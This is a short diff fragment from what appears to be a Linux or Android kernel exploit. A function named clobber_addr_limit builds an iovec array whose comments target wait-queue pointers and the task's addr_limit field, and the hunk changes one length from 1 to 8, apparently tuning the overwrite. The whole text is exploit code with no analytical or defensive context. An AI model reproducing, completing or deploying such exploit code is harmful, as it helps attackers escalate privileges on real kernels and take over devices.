@@ -177,7 +177,7 @@ void clobber_addr_limit(void)
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
     sizeof(testFill), /* iov_len (currently in use) */  // wq->task_list->prev
     &testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
-    1, /* next iov_len (sizeof(addr_limit)) */
+    8, /* next iov_len (sizeof(addr_limit)) */
     &testDatum2, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
